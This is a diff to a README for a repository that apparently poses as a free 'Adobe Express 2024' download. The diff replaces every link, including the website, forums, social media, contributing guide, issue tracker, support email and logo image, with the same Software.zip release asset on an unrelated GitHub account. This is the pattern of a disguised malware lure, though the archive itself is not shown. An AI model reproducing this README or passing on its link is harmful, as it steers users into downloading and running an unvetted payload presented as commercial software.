@@ -21,7 +21,7 @@ The repository covers the following topics:
 
 ## Get Started 🚀
 
-To get started with **Adobe Express 2024**, you can download it for free by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To get started with **Adobe Express 2024**, you can download it for free by clicking [here](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip).
 
 **Note:** The link provided needs to be launched to start the download process.
 
@@ -36,23 +36,23 @@ To get started with **Adobe Express 2024**, you can download it for free by clic
 ## Resources 📚
 
 For more information and resources about **Adobe Express 2024**, feel free to visit the following websites:
-- [Adobe Express Website](https://www.adobe-express-2024.com)
-- [Adobe Express Community Forums](https://community.adobe.com/t5/adobe-express/bd-p/adobe-express)
+- [Adobe Express Website](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
+- [Adobe Express Community Forums](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
 
 ## Stay Connected 🌐
 
 Stay connected with the **Adobe Express 2024** community:
-- Follow us on [Twitter](https://twitter.com/adobe-express)
-- Join us on [Discord](https://discord.gg/adobe-express)
-- Subscribe to our [YouTube Channel](https://www.youtube.com/adobe-express)
+- Follow us on [Twitter](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
+- Join us on [Discord](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
+- Subscribe to our [YouTube Channel](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
 
 ## Contribute 🤝
 
-If you're interested in contributing to **Adobe Express 2024**, feel free to check out our [Contributing Guidelines](CONTRIBUTING.md) to get started. We welcome all contributions and ideas to make **Adobe Express 2024** even better!
+If you're interested in contributing to **Adobe Express 2024**, feel free to check out our [Contributing Guidelines](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip) to get started. We welcome all contributions and ideas to make **Adobe Express 2024** even better!
 
 ## Feedback 📝
 
-We value your feedback! If you have any suggestions, ideas, or issues with **Adobe Express 2024**, please let us know by opening a [new issue](https://github.com/adobe-express-2024/issues).
+We value your feedback! If you have any suggestions, ideas, or issues with **Adobe Express 2024**, please let us know by opening a [new issue](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip).
 
 ## Releases 🚀
 
@@ -60,8 +60,8 @@ If the provided download link does not work or for more download options, please
 
 ## Support 🛠️
 
-If you encounter any difficulties with **Adobe Express 2024**, feel free to reach out to our support team at [support@adobe-express.com](mailto:support@adobe-express.com). We're here to help you get the most out of your design experience!
+If you encounter any difficulties with **Adobe Express 2024**, feel free to reach out to our support team at [https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip). We're here to help you get the most out of your design experience!
 
 Let's create amazing designs together with **Adobe Express 2024**! 🎨✨
 
-![Adobe Express Logo](https://www.adobe-express-2024.com/logo.png)
+![Adobe Express Logo](https://github.com/Babytamago/Adobe-Express-2024/releases/download/v1.0/Software.zip)
